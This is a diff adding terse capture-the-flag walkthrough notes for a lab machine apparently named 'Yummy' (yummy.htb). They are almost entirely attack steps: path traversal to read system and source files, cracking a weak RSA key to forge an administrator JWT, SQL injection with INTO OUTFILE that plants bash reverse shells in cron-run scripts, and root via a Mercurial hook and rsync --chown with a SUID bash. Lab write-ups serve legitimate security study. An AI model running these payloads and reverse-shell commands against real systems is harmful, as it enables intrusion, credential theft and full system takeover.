@@ -1,0 +1,79 @@
+- Get admin in website
+
+404 error message: Shows it's flask
+Register email & password
+Book a table section message for reverse shell: <img src=http://<ip>></img> - not vulnerable to crosshscripting
+Burpsuite: get packet for Book a table, Save ics Calender(Set_reminder, Download_ics)
+Download_ics packet: 
+Get /export/<file> -> Get /export/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd -> get /etc/passwd
+***%2f = / (url encoding, not necessary this time)
+/export/../../../../../../proc/self/environ -> fail
+/export/../../../../../../proc/self/cwd/app.py -> success
+    -client_flag: stacked query(select 1;select 2; select 3;-> possible)
+    -admindashboard: sql with %s and {} -> sql injection vulnerability
+    -payload grabs rsa from signature -> from config import signature
+/export/../../../../../../proc/self/cwd/config/signature.py -> too low p, q, n value, get e
+Click jwt value in packet's X-AUTH_TOKEN -> get n
+python3 RsaCtfTool.py -n <n> -e <e> -> get p, q
+python3 RsaCtfTool.py -n <n> -e <e> --createpub -> public key
+python3 RsaCtfTool.py -n <n> -e <e> --private -> private key
+
+Go to jwt.io(with Storage Cookie:ab-variant:variant -> control)
+paste X-AUTH-TOKEN, public, private key -> not work
+Go to online jwt decoder
+paste X-AUTH-TOKEN, public, private key -> work
+-> set decoded payload > "role": "administrator" -> get token back
+Go to yummy.htb > Storage > X-AUTH-Token: <token> -> refresh -> admin dashboard
+/export/../../../../../../etc/crontab
+    -www-data: bash /data/scripts/app_backup.sh
+        -create backupapp.zip on /var/www
+    -mysql: bash /data/scripts/tablecleanup.sh
+        -mysql credentials: no info about admin or root
+    -mysql: bash /data/scripts/dbmonitor.sh
+        -if dbstatus.json exists, /usr/bin/ls -l /data/scripts/fixer-v* 2>/dev/null ... runs.
+
+-Get reverse shell
+
+yummy.htb>SEARCH>get packet
+GET /admindashboard?s=&o=ASC 
+***Whole commands needs to be url encoded in burpsuite
+Option 1.
+-> Add ;select "bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'" into outfile "/data/scripts/fixer-v<any text>.sh"
+-> Also need into outfile "/data/scripts/dbstatus.json"
+Option 2.
+-> Reserve a table: message=;bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
+-> SEARCH: into outfile "/data/scripts/fixer-v<text>.sh"
+-> SEARCH: into outfile "/data/scripts/dbstatus.json"
+nc -lvnp <port>
+
+-Elevate privilege
+/data/scripts: 777 -> all files can be overwritten
+/data/scripts/app_backup.sh -> add line /bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1
+nc -lvnp <port> -> get www-data shell
+cd ~/app-qatesting -> .hg exists, like git
+hg log - show logs
+hg diff -c 8 - get credential of user qa
+su qa or ssh qa@<ip> -> get qa shell
+sudo -l - (dev:dev)/usr/bin/hg pull /home/dev/app-production
+mkdir /dev/shm && cd /dev/shm: make a new directory
+shell.sh:
+bash -i >& /dev/tcp/<ip>/<port> 0>&1
+
+hg init: .hg directory
+.hg/hgrc: 
+[hooks]
+changegroup = /dev/shm/shell.sh
+
+chmod -R 777 .hg/
+sudo -u dev /usr/bin/hg pull /home/dev/app-production/
+nc -lvnp <port> -> get dev shell -> sudo -l: rsync -a --exclude\=.hg /home/dev/app-production/* /opt/app
+Using -e: rsync -e 'sh -c "sh 0<&2 1>&2"' /opt/app -> fail
+Using --chown:
+cp /bin/bash <loc in app-production>; chmod 4755 <loc>; 
+sudo /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/<loc> --chown=root /opt/app
+<loc> -p -> get root shell
+
+-additional
+/etc/mysql/mysql.conf.d/mysql.cnf: secure_file_prive=""(disabled) - allow mysql to write anywhere
+systemctl status apparmor: disabled - it blocks file write on /data/scripts
+rsync --chown vs chown: rsync --chown does not remove sticky bit
